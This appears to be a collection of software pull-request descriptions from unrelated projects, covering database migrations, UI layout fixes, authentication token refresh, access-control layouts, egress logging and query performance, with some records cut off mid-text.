body: ## Summary Creating or updating a notification returned HTTP 500 because `NotificationDefinition.FallbackNotificationId` is mapped by `TableMapping` and included in every `INSERT`/`UPDATE`, but migrations 001–077 never added that column to `NotificationDefinitions`. Migration 078 adds `FallbackNotificationId` as a nullable integer. The same FluentMigrator migration runs on SQLite and PostgreSQL through `DbFactory`. Fixes #1403 ## Tests - `Migration78Test` checks the SQLite column is a nullable integer, round-trips create/update through `NotificationRepository`, and reapplies migrations idempotently. - The same fixture applies migration 078 on PostgreSQL when `SEEDARR_TEST_POSTGRES` is set (verified locally against PostgreSQL 16). Without that variable the Postgres case is skipped. - `NotificationControllerIntegrationTests` creates a notification, sets a fallback, clears it with `PUT`, sets it again, and reads it back on both `/api/v1/notification` and `/api/v1/notifications`. ## Results - `dotnet test src/NzbDrone.Core.Test/Seedarr.Core.Test.csproj --filter FullyQualifiedName~Migration78Test` with `SEEDARR_TEST_POSTGRES` set: 5 passed. - `dotnet test src/NzbDrone.Integration.Test/Seedarr.Integration.Test.csproj --filter FullyQualifiedName~NotificationControllerIntegrationTests`: 1 passed.

author: mikemott
body:
Closes VTL-99

## Problem
Some traffic camera sites have two or more views (one per direction), but people only ever saw one. VTrans lists each view as its own camera, 40–90 m apart, so the markers stacked on top of each other unless you zoomed in very far. At I-89 Exit 14 in South Burlington, 4 views share the exact same point, so 3 couldn't be clicked at all.

## Fix
- **One marker per site.** `utils/cameraSites.ts` groups views within 100 m. A site with several views gets a small count badge on its marker; a click opens its first online view.
- **View buttons in the camera window.** Labelled by the direction at the end of the camera's name ("North" / "South"), or "View 1", "View 2"… when directions are missing or repeat (Exit 14, Westmore). Offline views are dashed and announced as offline.
- **Links stay exact.** Switching views updates the panel and the shared link to that view. Views are attached in one place (`shownPanelContent` in `WeatherMap.tsx`), so shared links, search and "What's here?" get the buttons too.
- Single-view cameras look the same as before.

## Checked against the live feed
89 views → 72 markers. Multi-view sites: Alburgh, Bolton, Brookfield, Williston, Winhall, Fair Haven, Hartford, Mendon Mountain, Brattleboro Bridge, Milton Bridge, Waterbury Exit 10, Westmore, Westfield, Grand Isle (2 views each) and South Burlington Exit 14 (4).

## Tests
- `npm run check` passes (891 unit tests).
- New tests: grouping, labels and ordering (`cameraSites.test.ts`), one marker per site with the badge (`CameraLayer.test.tsx`), and the view buttons (`CameraDetail.test.tsx`).
- Checked locally in Chromium with real Bolton images: both views load, switching works, and the URL follows the chosen view. Visual baselines don't include cameras, so they're unaffected.

body:
## Why
Chroma's player-confirmed visit to an Orario confectioner needs a whole chocolate cake bought with valis and saved to the same authoritative wallet/inventory used by RPG Lab. System-store `purchase` is gold-only and cannot handle city goods.

## Changes
Add `local_purchase` action for explicitly approved, confirmed merchant transactions in the city. It requires a valid item identifier, integer unit price and quantity, sufficient valis, CAS event source and a new unique reward source. On commit it subtracts valis, adds the item to inventory, and records the source. The existing gold shop remains untouched. No item/valis changes before a confirmed purchase event.

## First use
Chocolate cake, item `chocolate_cake_whole`, one unit, 2,200 valis at the city confectionery; starting wallet now independently corrected to 31,030 valis.

No change to other campaigns or existing events.

body:
t-23zs（plan-12 の 14 本の外の小さな PR。D5 の残りを直す）。

## 何が起きたか

#9（D7）の CI の job `test` で、D5 の並列の試験「アクター 500 の時間の帯を組む間も引き当ては 100 ms で答える」が 117.9 ms で落ちた（D7 の code は触っていない所）。D5 の PR に「余裕が小さい」と書いて残していた物。時間の帯を 4 枚並べて描くと、読む接続 4 本をみな重い読みが取り、引き当て（`/v1/resolve`）が空きを待っていた。

## 何を

- 相関図（`/v1/graph`・系図・関係の網の記録）と時間の帯の重い読みは、別の読むだけの接続 2 本（`HEAVY_READS`）だけを使う。軽い読み（引き当て・検索・画面）の 4 本は取らない。
- 初めは札（semaphore）で重い読みの数を 2 に絞ったが、返した接続が pool に戻りきる前に次の読みが新しい接続を取る隙間が残り、試験が 3 本で落ちたので、接続そのものを分けた。
- 接続の設定（WAL・外のキー・再帰の trigger・読むだけ）は、ほかの読む接続と同じ物を写す。
- docs の db.md に 1 文。

## 先に書いた試験（TDD）

試験だけの commit（84bb988）: 時間の帯と系図を 8 本並べて描き続ける間、軽い読みの接続の使われている本数を 2 秒見張り、2 本を超えないこと。今の main では「重い読みが同時に使った読む接続: 4 本」で落ちた。実装の commit で通った（担当が手元で 3 回流して 131 passed・0 failed。時間の帯の 100 ms の試験も通った）。

author: provnir
body:
<!-- claude-projects-attribution: {"github_login":"provnir"} -->
_Requested by **Nir** · [project thread](https://claude.ai/code/project/chan_018NZpcq4mn7Bdai5tieF5Qx?thread=cmsg_018NZpcq4mn7Bdai5tieF5QxBXsyHucuNGEXeqPJaxFP8J)_

## What Apple says (verified against Apple's own pages)
- Outer display: compact width, behaves like other iPhones and honours supported orientations. Inner display: regular width and height. ([Prepare your app for iPhone Duo](https://developer.apple.com/videos/play/tech-talks/111461/), [Design for iPhone Duo](https://developer.apple.com/videos/play/tech-talks/111466/))
- Opening or closing resizes the same scene in place; the process and scene stay alive. Lay out by size class and available width, never by idiom, orientation or `UIScreen.main`.
- Full edge-to-edge on the inner display needs the iOS 27.1 SDK. Our CI already builds with Xcode 27.1.
- Standalone `UITabBar`/`UINavigationBar` are not moved into the vertical bar region; only container-owned bars are ([Raise the bar with iPhone Duo](https://developer.apple.com/videos/play/tech-talks/111462/)).
- Apple publishes no point sizes, so nothing here depends on one.

## Audit
- Info.plist: all orientations, multiple scenes on, no `UIRequiresFullScreen`. Nothing to change.
- Upstream already ships the iPhone Duo work for its own UI (frontend full width, vertical bar, onboarding, stand-by, Assist, hinge sensors). It came in with the merges.
- Khala code has no idiom checks, no `UIScreen.main` and no orientation locks. The fixed widths are previews or small controls (picker 276, car art ≤322, dials 200/220). Those are fine on both displays.
- The UIKit pieces already re-lay out on resize: the zoom container, the still pager (keeps its page) and the live player (CSS 100%).
- Widgets and other extensions are not in Khala builds (`khala_ship.py` strips them), so they are out of scope here.

## Changes
- **Readable column in regular width.** Today, Settings, device screens, Cameras and placeholders keep their full width in compact width, so iPhone and the outer display look unchanged. author: krzysztofpajak
body:
Resolves: no issue, the problem is described below
Type: **feature**

## Issue
If a store is open to registered customers only (Guests lose the "Public store. Allow navigation" permission), or the store is closed, guests are sent to `/login`. That page renders inside the full storefront layout, so a guest still sees the store's content: the search box lists the categories, the footer lists CMS pages and links to blog, news, knowledge base and new products, and the newsletter box and promo block are rendered. View components do not go through the `PublicStore` filter, and only the menu checks the permission itself.

To reproduce: remove "Public store. Allow navigation" from Guests, then open the store in a private window. You are redirected to `/login`, which shows the category drop-down in the search box and the footer links.

## Solution
The guest-reachable screens keep their URLs, actions and views. When the visitor may not browse the store, they render in a new minimal layout instead of `_SingleColumn`, similar to the admin login page: theme styles, logo, language selector, cookie consent and the form. The header, menu, search box, footer and content widget zones are not rendered.

- `IStoreAccessService` (`Grand.Web.Common.Security.Authorization`) returns `StoreAccess` for the customer of the request:
  - `Closed`: the store is closed and the customer has no `AccessClosedStore`.
  - `RegisteredOnly`: the customer has no `PublicStoreAllowNavigation`.
  - `Open`: everyone else.
- `Views/Shared/_GuestAccount.cshtml` asks the service and renders as `_SingleColumn` (Open) or `_LayoutAuth` (otherwise). Login, register, register result, password recovery and confirm, account activation, two-factor and the OIDC link and failure views set `Layout = "_GuestAccount"`; `StoreClosed` always uses `_LayoutAuth`. View models and controllers are unchanged, so a new guest screen only needs the layout name.
- `_LayoutAuth` keeps the `head_html_tag`, `body_start_html_tag_after` and `body_end_html_tag_before` zones, which carry scripts such as analytics and consent.
- The login page hides the register, password recovery and guest order links in a closed store (those actions redirect to Store closed; staff still sign in with the form or SSO), and shows the guest order link only when the store is open to guests, because the guest order pages need navigation.
- `TwoFactorAuthorization` (GET and POST) gets `[PublicStore(true)]` and `[ClosedStore(true)]` like `Login`. Before, a customer with two-factor sign-in on was sent back to `/login` or to Store closed after the password step.
- `SetLanguage` gets `[ClosedStore(true)]`, so the language selector works on the sign-in screens of a closed store.
- No new CSS and no bundle rebuild: the layout uses Bootstrap utility classes the theme bundles already ship.

Known limits, left for separate PRs:
- The Facebook and Google plugin "sign-in failed" views still use `_SingleColumn`.
- A theme that overrides one of these account views keeps its own `Layout` line until it switches to `_GuestAccount`. Modern and Nordic do not override them.

## Breaking changes
None intended. The two-factor step and the language switch are now reachable by guests of a closed or registered-only store, as the login page already was. Behavior for a store open to guests is unchanged.

## Testing
1. `dotnet test src/Tests/Grand.Web.Common.Tests` and `dotnet test src/Tests/Grand.Web.Tests` pass. New tests: `StoreAccessServiceTests` (4) and `StoreAccessAttributeTests` (two-factor actions and `SetLanguage` carry the exemptions).
2. Admin → Access control: remove "Public store. Allow navigation" from Guests, then restart the app, because permissions are cached.
3. In a private window open `/`. It redirects to `/login`, which shows the logo, the language selector and the form. The page source has no `search-box`, no `<footer>` and no guest order link. `/register` and `/passwordrecovery` look the same.
4. Submit a wrong password. The page re-renders with the error and stays in the minimal layout.
5. With two-factor sign-in on for a customer, sign in: the code screen opens in the minimal layout instead of looping back to `/login`.
6. Give Guests the permission back. `/login` shows the full layout as before.
7. Settings → General → Store closed: on, then restart. As a guest, `/` redirects to `/storeclosed` (minimal layout). `/login` shows the form without the register, forgot-password and guest-order links, `/register` redirects to `/storeclosed`, and `/changelanguage/{code}?returnUrl=/login` returns to `/login`.

body:
## What
- The server's block line used to close any new connection that had not said hello within 5 s. On a cold first join, the game sends its hello on its first frame after the 5-6 s freeze at the welcome, so the line was closed before it could serve the join. That reading comes from the Lane A cold plays; #1539's logging is there to confirm it.
- The wait is now `block_line_hello_ms`, set to 60 s in data/network.json.
- At most `block_line_pending_max` (32, clamped to at least 1) connections can wait at once. A new connection past that closes the oldest. These closes log one summary line every 5 s at most.
- New test: `src/worldgen/tools/test_block_line_hello.gd` (ports 8300-8399). It checks three things:
  - a hello after a pause shorter than the wait opens the line;
  - a hello after the wait is refused and its connection closed;
  - past the cap, the two oldest connections close and exactly four keep waiting.

## Behaviour change on the join path
Hold the merge until the coordinator says go. It needs one Lane A cold play.

## Review
- Independent gate-review passed on 92b63fb5. Its should-fixes 1 and 3 and its nice-to-have 5 were applied, and the follow-up review passed on head 5680da8f.
- Deferred: per-source eviction. Today a flood of silent connections can still evict a real player's waiting line. The join then falls back to the game connection, which is no worse than before.

`tools/tests_for_diff.py origin/dev 5680da8f`: change plan, 17 fast tests.

author: hdkshingala
body:
## What was wrong

`traycer host claim` reads who owns the computer at authn first (`GET /api/v3/hosts`), sending the command line's stored sign-in token. That read never refreshed the token. The default access-token lifetime is four hours. Once the stored token expired, each run printed “This computer's ownership could not be confirmed. Try again.” A later run could proceed after another command such as `traycer whoami` refreshed and saved the token, or after a fresh sign-in.

Two more calls send the stored sign-in to authn after a wait during which it can run out, and had no retry of their own: `host claim`'s team release (after the question to the person) and `profile login`'s sign-in request record (during the provider's sign-in wait). They are fixed here too.

## The three calls, and the rule

| Call | Refresh shared with |
| --- | --- |
| `host claim`: the ownership read | the release, in the same command run |
| `host claim`: the team release | the ownership read, in the same command run |
| `profile login`: the sign-in request record | the other records of the same wait |

The single refresh covers only these direct calls to authn. `host claim`'s host calls and its final provisioning step keep their own existing recovery, which can refresh on their own refusals.

Each call:
- on a 401 can trigger one resend after a usable pair is obtained, by rotating it or by adopting one another process already saved;
- keeps its first answer when the refresh is refused or unavailable. The single exception is below;
- In `host claim`, a refusal from the original sign-in generation can share the claim's one in-flight refresh. A refusal on the replacement generation is final, even when the refreshed access token has the same bytes.
- A first response other than 401 keeps the result, printed line, error code, and exit code from `main` without a refresh request.

`profile login` reads the stored sign-in for every record, as `main` does:
- After a local sign-out, a record answers unauthorized and posts nothing.
- After another sign-in, it is sent on that account.
- The wait sends its records one at a time, awaiting each (`awaitUntilSettled`), and the client relies on that.
- Once a record has asked for the refresh, a later record's first answer is final, because the wait has used its one recovery, whatever the stored file now holds. For example, another sign-in that replaced the stored one during the wait and is refused is not refreshed.
- Each record request keeps its own 15 s bound (`SIGN_IN_REQUEST_FETCH_TIMEOUT_MS`). The refresh is bounded as described under "Known limit", and the record's cancel signal cuts it.

`readSignInEnvironments` now goes through the same helper, and every path is `main`'s: any identity rejection, 403 included, enters one locked revalidation.

## What a person sees: before and after

One final rejection changes. When authn refuses the stored sign-in on `host claim`'s ownership read with a 401, and the refresh is refused too (signed out, or the refresh token has expired), the command now ends on the rejected-credential line:

| | Line | Code | Exit |
| --- | --- | --- | --- |
| Before | "This computer's ownership could not be confirmed. Try again." | `CLOUD_UNREACHABLE` | 1 |
| After | "The stored credential was rejected. Run `traycer login` to re-authenticate." | `AUTH_REJECTED` | 1 (unchanged) |

The after line is the one the command line already prints for a refused refresh (`STORED_CREDENTIAL_REJECTED_MESSAGE` in `internal/host-door-words.ts`).

The other differences a person can see:
- **An expired token that refreshes:** the call goes on as it would with a fresh sign-in, where `main` ended on the call's refusal.
- **A refreshed pair that cannot be saved:** the store's disk warning can appear, as for every other command.
  - If the write is refused for lack of space before anything is spent, the disk line ("Disk is full: could not save your sign-in. Free up some space and run the command again.") is printed, the refresh counts as unavailable, and the call's first answer stands.
  - If the refresh was spent and is still unsaved after up to three more save attempts a second apart, the call is sent again on the pair held in memory. If the pair is still unsaved, the warning is printed when the store's final result reports low disk space. The spent-base marker left behind lets a later command recover the pair only while authn can still replay that rotation.

A 403, an unreachable refresh, or a 401 on the second ask keeps each call's existing line, code and exit code.

Neither `traycer host claim` nor `profile login`'s sign-in request record is in the released command line (tag `cli-v1.5.4`).

## Files outside the command line

Two shared result modules each get a named subtype whose `unauthorized` carries `status: 401 | 403`, so the command line can tell a 401 from a 403. The existing result types are unchanged:
- `clients/shared/host-client/host-ownership.ts`: `HostOwnershipHttpResult`;
- `clients/shared/host-client/team-computer-release.ts`: `TeamComputerReleaseHttpResult`.

Their tests check that a 401 carries 401 and a 403 carries 403. No app, desktop or phone-app file changes. The existing consumers tell results apart by `kind` and read only the fields they read before.

## Not changed here

These calls also send the stored sign-in to authn, and none retries on its own. Each keeps `main`'s behaviour when the sign-in runs out there:

| Call | What `main` does when the sign-in has run out at that call |
| --- | --- |
| Link phone: the code mint, the status poll and the answer | The command validates, and can refresh, the stored sign-in at its start. A later 401 answers unauthorized and ends that run with the call's own message; on the status poll it ends the flow. |
| `bot list`: the directory read | It runs after the environments read, which can refresh. A 401 ends the command on the rejected-credential line. |
| Team install (`install --team`, `ensure --team`, `host use`): the install-token mint and the ownership read | They run after the environments read that resolves the team, which can refresh. A mint 401 gives the rejected-credential line; an ownership 401 gives the ownership-unconfirmed line. |
| The give's confirmation after the restart | It reads on the transfer's current sign-in. The move has its own recovery on a 401, which may already have been used. A 401 here leaves the transfer unconfirmed, and the move may already have applied. |
| The host-credential mint in `monitor` and `worktree delete` | A 401 on the mint gives an advisory that provisioning is unavailable; the command can still finish its own work. |
| The host-credential mint in the install probe | It can rotate the sign-in after authn refuses the mint, within the probe's remaining time, to judge whether the sign-in is rejected. It does not redo that mint. |

## Known limit

When two calls ask on one stored sign-in at once, the refresh runs under the signal of the first caller it refuses, and only that signal cuts it. A second caller waits, whatever its own signal does, for the first caller's path: the credentials lock wait (12 s), the refresh request (10 s), and, after a spend whose save fails, up to three more save attempts a second apart, each taking the lock again. No caller asks on one sign-in at once today: `host claim`'s two calls and the wait's records are sequential.

## Tests

**What is faked:** the sign-in service, by a stubbed `fetch` that the real HTTP helpers call. For `host claim`, the local computer's calls and the terminal question are faked too. The stored-credentials file is real, in a temporary home. The claim, record, helper and environments-read test files each have a refresh case in which the fake reads that file when the resend arrives and asserts the refreshed pair is already in it.

- **`host claim`** (`commands/__tests__/host-claim.test.ts`): its refresh cases run through the real stored-sign-in resolver. Two ownership refusal cas

author: dpleshakov
body:
## Problem

The apply that ran a selection kept it staged forever: `SettlePending` preserved `Select`
for every applied key — a v0.1.1 TUI behavior ("the applied selection stays remembered")
carried unchanged into the Store for 0.1.2. One flag carried two meanings, an action
waiting for an apply and the TUI's remembered checkmark. In the TUI the applied row kept
its pending mark forever and every target open offered the restore dialog for what was
already applied — seen live on a real target since 0.1.1. In 0.1.2 the CLI's staged
refusal turned it into a deadlock: one-shot commands refuse while staged actions wait,
`penates apply` answers `kept: already installed` with zero writes, and the entry never
clears. Reset had a milder form of the same flaw: consumed unconditionally, even when
its step failed. All of this contradicted the concept's definition of pending actions
as "the actions chosen since its last apply".

## Approach

One consumption rule now covers all three item actions: an apply consumes `Select` (with
its answers) and `Reset` only when the item's outcome satisfies the intent — the step
landed or the plan kept the item as it is. A failed step, an item the plan excluded, and
an item that never reached the plan keep their actions staged and repeatable; removals
were already consumed on success only.

`SettlePending` receives the outcome per key instead of the selection list. Both clients
derive it from what they already hold — the CLI from the result rows plus the error map,
the TUI from the step states, where a kept step carrying exclusion lines counts as
excluded. Select and reset ride one plan step, so per-key outcomes suffice; a key with
no outcome is not consumed, which leaves a bare reset of an unreachable item to the
load-time validity check that drops it with a report.

The remembered-checkmark role of the flag is dropped rather than relocated: after an
apply the tree returns clean, and what was applied is carried by the results screen and
the exit record. Registries an older build left with a satisfied selection staged
self-heal on their first apply — the kept verdict consumes the entry; no migration.

## Notes

- The update form still prefills variable answers — from the lock record the apply
  writes (`storedAnswers` reads pending over lock), pinned by the re-pinned form tests.
- Ten existing TUI tests pinned the removed lingering behavior. They are re-pinned, not
  deleted: their scenarios survive, with selections staged through the store
  (`stageSelection`) in the cases `space` cannot stage — an installed item at the kit's
  version has no default action.
- A genuine step failure cannot be injected portably in a mixed TUI run (blocking writes
  fails every step), so the failed branch of the settle input is pinned at
  `satisfiedKeys`; the excluded branch is pinned end-to-end.
- A step failing at its lock save leaves the item's files in the target with no lock
  record — found through the io-injection test and recorded as the backlog entry
  `failed-step-leaves-unowned-files`, out of scope here.
- Reset's unconditional consumption was released behavior; the changelog entry under
  `[Unreleased]` calls the alignment out separately from the loop fix. No on-disk format
  changes; targets 0.1.3.

## Testing

The class, not the instance: the invariant that after any apply the registry holds only
unsatisfied intent is pinned in all three layers — a state unit matrix over every action
× outcome combination, CLI end-to-end runs (the deadlock loop doubling as the self-heal
proof, a failed selection retried, an excluded one kept beside a satisfied neighbour),
and TUI reopen-and-mixed-run scenarios. `make check` passes on the branch: build, vet,
lint, the full suite with `-race`, coverage 87.8% against the 85% gate, licenses, and
the builtin-kit load check.

author: shooter-git
body:
## What changes for someone using the studio

The agent's replies now lay out properly on a phone, a tablet's sheet and a phone held sideways. Before, a four-option choice with long-ish labels on a 390 px phone was squeezed into one strip: the labels ran into each other and the last one was cut off at the screen edge. A row of three buttons also wrapped as two plus one, each a different width. The desktop bar looks the same as before wherever things already fit.

- **Choice and row of buttons (and toggles), same rule:** each stays on one line, as wide as its words, when it fits (as now). When it doesn't fit, it goes into the most equal columns that fill every row, so no line ends short or with one control alone: 4 → 2×2; 6 → 3×2 or 2×3; 3 or 5 → one under another. When even two columns don't fit, everything stacks full width.
- **Alignment:** stacked choices and stacked buttons both start their labels (and play icons) at the start, so a group's controls line up. In columns, labels are centred for both choices and rows.
- A choice still looks and acts as one segmented control, with the chosen option lit. A label too long even for a full-width button goes onto a second line. Nothing is ellipsized.
- **Slider:** a slider whose name is longer than its name column, or that has little room, shows its name and value on one line with the slider full width underneath. Little room here means narrower than 400 px: a phone, a sheet, or two sliders side by side. Before, the name was cut off with "…". Sliders with short names on the desktop bar keep their aligned name column. Sliders side by side line up by their tracks.
- **List:** a row's detail sits beside its words, or under them when the two don't fit side by side. Before, the words could be cut down to nothing.
- **Spacing:** one gap (8 px) between the pieces of a view or a group, including a group's title and its first control and the lines of a wrapped choice or row. Twice that around a group.
- **Touch:** buttons, list rows and sliders in a reply are at least 44 px tall on touch screens. They were 34 px.
- **Tray:** the phone's tray row is unchanged. It still scrolls sideways in one row.

## How the layout is decided

The decision comes from measurement, not from device names. `apps/web/src/ui/view-fit.ts`:

1. It measures each option or button with its words on one line. This happens in a `data-measuring` state that is never painted.
2. It reads the room its place has.
3. A pure helper, `fitColumns`, picks: one line, the most even columns that fill every row, or one column. Choices and rows use the same rule.
4. The CSS draws the result from `data-cols` / `--cols`.

The decision is made again when the blocks the view draws change (a new turn, a reply finishing) and when its width changes, not on every render (the page renders again with every studio change, e.g. while a reply's slider is dragged). That uses one `ResizeObserver` per view, which goes away with the view, so nothing runs while the page or bar is closed. It also runs once if a font finishes loading. The helper has unit tests. The slider's narrow layout is CSS only (a container query). Why not CSS only for the choice: CSS can't tell whether a set of labels fits on one line and switch layout because of it, and an `auto-fit` grid needs a fixed minimum width that ignores the labels.

## Checks

- `tools/ui-check.mjs` has two new faked replies, each the newest turn, so the desktop bar shows them too. Both are looked at on every screen (desktop, small desktop, narrow window, tablet, phone 390×844, small phone 320×568, phone on its side):
  - **Comparing takes:** two titled groups. One has a four-option choice of long-ish labels and a row of three long buttons. The other has a three-option choice and three Keep buttons.
  - **Everything at once:** a six-option choice, five buttons with 28–35 character labels, a six-column table with a button column, long-named sliders including a kHz value, a row of two sliders, toggles, a list with long details, a chart, a notes strip, a waveform strip, and a group inside a group.
- New check `viewFits` runs on every view of a reply and on the tray. It fails when:
  - a control runs past the view (unless a table scrolls it into view);
  - two controls overlap;
  - a choice scrolls sideways;
  - a control's words spill past its edge or are cut off or ellipsized, slider names and list rows included.
- The existing "cut off" and "covered" checks did not catch the squeezed choice: each button's box was whole, and only its words spilled over the next one.
- New check `fitsOnce`, run on the thread's reply on every screen: it moves a reply's slider five times and fails if the view is measured again. Before the last commit it was measured 6 times; now 0.
- **Against main's layout** (main's `AgentView.tsx` and `app.css` with this branch's ui-check): 172 problems, all in the two new replies. Comparing takes fails on every touch and narrow size; everything at once fails on every size. The existing checks flag none of the comparing-takes problems.
- **With this branch:** "Nothing wrong" at every size.
- `pnpm lint`, `pnpm typecheck` and `pnpm test` pass.
- Engine fingerprint unchanged (`2cfe61361ef7`). Nothing under `packages/engine/src` or `packages/session/src` changed.

## Before and after (screenshots described, not committed)

Taken at 2× on a scratch server at iPhone 15 (393 px), iPhone SE (320 px), iPad (its 340 px sheet), a phone on its side and desktop:

- **iPhone 15, comparing takes.**
  - Before: the four options are squeezed into one strip, with labels running over the next option's play icon and the last label cut off. The solo and keep buttons wrap two and one, each a different width.

author: lephuong123
body:
## Vấn đề
Daemon chạy SQLite đồng bộ trên event loop. Đo trên bản sao `hub.db` thật (1,5 GB, 734k event, 6.194 run): truy vấn chậm làm đứng mọi RPC và luồng SSE, nên đổi tab và chữ chạy của trả lời khựng 0,2–3,7 s.
- `run.list` (`SELECT * … ORDER BY queued_at DESC`) quét cả bảng `runs` (~300 MB, trong đó cột `diff` chiếm 264 MB): 3,8 s.
- `cost_since` không có index `ended_at`, lại bị gọi N lần trong `agent.list` (32 agent = 124 ms), thêm ở `hub.status` (55 ms).
- `tui.snapshot` đếm `type LIKE 'learning.%'` nên không dùng được `events_type_ts`: 157 ms. Trang Điều phối gọi cả `tui.snapshot` chỉ để lấy một dòng agent.
- Panel "Hành động gần đây" của trang Điều phối đọc `events.query{limit 3000}` theo `ts ASC`, tức 3.000 event CŨ NHẤT (2,27 MB, 80–300 ms), nên hiện việc từ tuần trước.

## Số đo (bản sao DB thật, có index mới)
`run.list` 3,8 s → 5 ms · `hub.status` 55 → 3 ms.

## Thay đổi
- **Migration v32** (thêm vào cuối `MIGRATIONS`): `runs_queued(queued_at)`, `runs_ended(ended_at)`, `runs_agent_ended(agent_id, ended_at)`.
- **`Store.list_runs` không chọn cột `diff`**. Đã rà mọi nơi gọi `list_runs` / `run.list` (web, CLI, chat, TUI, recovery, learning, capacity, manager ops): không nơi nào đọc `diff` từ kết quả danh sách. Diff vẫn có qua `get_run` / `find_run` / `run.get` / `run.diff` (trang một run, `last_work_run`, fileview, filehub, revert).
- **`cost_since`** theo agent dùng `runs_agent_ended`; thêm `cost_since_by_agent` / `cost_today_by_agent` (một truy vấn `GROUP BY +agent_id`, khoảng trên `runs_ended`). `agent.list` dùng bản gộp này.
- **`tui.snapshot`**: đếm `type >= 'learning.' AND type < 'learning/'` để dùng được index. Dựng dòng agent tách thành `_agent_row`, dùng chung.
- **RPC mới `tui.agent_state {id}` → `{agent: row|None}`**: chỉ đọc, không nhạy cảm, không phụ thuộc người gọi (cùng lớp với `tui.snapshot`, nên không thêm vào HUMAN_ONLY / SCOPED_READ). `mgr_state` ở web dùng RPC này; nếu daemon cũ chưa có thì quay về `tui.snapshot`. SSE của trang Điều phối và văn phòng (`with_row=False`) không hỏi trạng thái agent nữa.
- **`events.query`** nhận thêm `types`, `order: "desc"`, `workstream` (lọc theo `run_opts.manager_workstream`; `""` = run không gắn luồng). `_actions` lấy 50 `manager.action` mới nhất của luồng đang xem (Sảnh = không luồng). TUI `manager` cũng đọc thẻ hành động mới nhất (`types` + `desc`, 500).
- CHANGELOG ("Chưa phát hành") và `docs/dev-notes/M7-ui.md`.

## Chưa làm: tạm dừng polling khi tab ẩn
Bộ lọc htmx `every 10s [document.visibilityState=='visible']` **không chạy được ở đây**. `base.html` đặt `htmx-config allowEval: false` và CSP là `script-src 'self'`, nên htmx bỏ qua bộ lọc (mặc định coi là `true`) và phát `htmx:evalDisallowedError`. Việc này cần JS: chặn `htmx:beforeRequest` của lượt poll khi `document.hidden`, rồi `htmx.trigger` một sự kiện để làm mới khi tab hiện lại. Phần JS thuộc PR khác (`app.js`), nên PR này không đổi template.

## Test
- Mới: `tests/test_perf_queries.py` (8 test): migration có đủ index; `EXPLAIN QUERY PLAN` dùng index cho `list_runs`, `cost_since` (toàn hub, theo agent, gộp), truy vấn chi phí của `tui.snapshot` và đếm `learning.*`; `list_runs` / `run.list` không có `diff` trong khi `get_run` / `find_run` / `run.get` / `run.diff` vẫn có; chi phí gộp bằng tổng theo từng agent; `tui.agent_state` bằng đúng dòng của `tui.snapshot`; `agent.list` ra đúng `cost_today_usd`; `query_events` mới nhất trước, lọc `types` và luồng; trang Điều phối: panel chỉ có hành động mới nhất của đúng luồng (Sảnh / luồng / luồng khác).
- Nhóm test liên quan (`test_web_manager`, `test_tui*`, `test_store`, `test_manager_workstreams`, `test_web`, `test_office*`, `test_hardening*`, `test_sec*`): 485 qua, 3 bỏ qua, 2 lỗi. Cả hai không do PR này: `test_sec_auth::test_audit_list_human_only_and_cli_blocked` cũng lỗi trên origin/main (Windows); `test_tui::test_top_three_agents_live` là test đo độ trễ, lỗi vì máy đang bận và chạy lại riêng thì qua.
- Bộ đầy đủ trên máy Windows này: ~153 test đã lỗi sẵn trên main (symlink, cp1252, đường dẫn `\`) và chạy ~1 giờ khi máy bận. Nhờ CI macOS/ubuntu xác nhận.

## Why

The e2e test "the app locks itself after ten minutes without use" failed about once in 30 runs, on `main` too.

Cause: `ApplyPolicy` loads the company policy asynchronously after unlocking, and `setLockAfter` called `touch()`. That restarted the idle timer as if the app had been used. If the server's answer arrived after the test's key press, the lock moved back by ten minutes.

author: wasimjalali
body:
## What and why

The Watch soak's guards check (#326) read "missing" on any day with an allowed WebFetch, because `tool_calls` stores no host. Every container HTTPS request, whether from WebFetch or Bash, goes through one Worker egress: the `*` HTTPS intercept in `server/do/runner/runner.ts`, which `WebEgress` answers. This PR records every request there and has the soak judge each allowed host against the day's `t:webfetch` list.

## Design

**The record.** It's written in `server/egress/webfetch.ts` and stored in the new table `egress_fetches` (migration `0600`).
- **When:** one row per outbound request, written *before* the request goes out. Each redirect hop gets its own row.
- **What it holds:** `at_ms`, `host`, `verdict` (`allowed` / `refused`), `code` (the refusal code, present exactly when refused), `runner` and `container_gen`.
- **What it never holds:** the path, query, headers or body.
- **Write failures:** a request whose row can't be written doesn't go out; it's refused with the new code `record`. A refusal whose row fails is still a refusal, and the failure is logged.
- **Append-only:** a trigger refuses any UPDATE.

**What the egress can know:**
- It knows the runner object and its container generation (the intercept's props).
- It can't know the run, turn or member: one container serves several sessions at once, and the props deliberately carry no token, chat or member (design 7). So no row names a person.
- It can't tell WebFetch from Bash either: both come through the same intercept. The record covers both; `tool_calls` still holds the WebFetch calls for the detail.
- Plain HTTP (the `DenyEgress`) is always refused and isn't recorded. I can add it if you want.

**Registry and rules.**
- New `ops/tables/egress.ts`, plus one line in `ops/tables/index.ts` for you to review. Class `retention_period`, no person keys, `export: false` (it's an operations log).
- **Retention:** a fixed `egress: 30` days (`DEFAULT_DAYS`), a plain D1 rule on `at_ms` and `n`. A test checks the 30-day cutoff.
- **Deletion:** `keep`. There's no member id, so no row follows the chat cascade; rows go by age within 30 days. A host could still carry data a refused exfil attempt put in a subdomain, but it's kept at most 30 days.
- **Backup:** `append_only` on `n`.

**The soak** (`ops/soak/collect.ts`, `checks.ts`, `types.ts`, on #326's final code). `GuardFacet` gets an `egress` field: either `{ allowed, offList }` or `{ unreadable }`.
- **The day's list:** the settings row keeps only the current `t:webfetch` and its last write time, and the audit log keeps it redacted. So the day's list is known only when the row was last written before the day began. If it changed on or after the day began, the check is `missing`, and the detail says why. No row, an empty list or a broken list means no host.
- **Verdicts:**
  - An allowed host off the list is a bypass: `unclean`, named by host. This covers WebFetch and Bash alike.
  - Every allowed host listed, with planted canaries and no leak: `clean`. An allowed WebFetch no longer makes the check missing.
  - An unreadable egress record (for example a deployment before `0600`) or an unknown day's list: `missing`.

## Tests

Written before the code, and red first.
- `server/egress/webfetch.test.ts`:
  - an allowed request records `{host, allowed}` before it goes out; a refused one records its code; an empty list records `not_listed`;
  - each redirect hop is a row;
  - a Bash-style request (curl user agent, POST and GET) is recorded the same way;

author: adsynthio
body:
## What and why

Home offered Rajma with "Cook now", and the cook screen opened on "Rinse the rajma and soak… at least 8 hours". A dish that needs hours of soaking can't be cooked now.

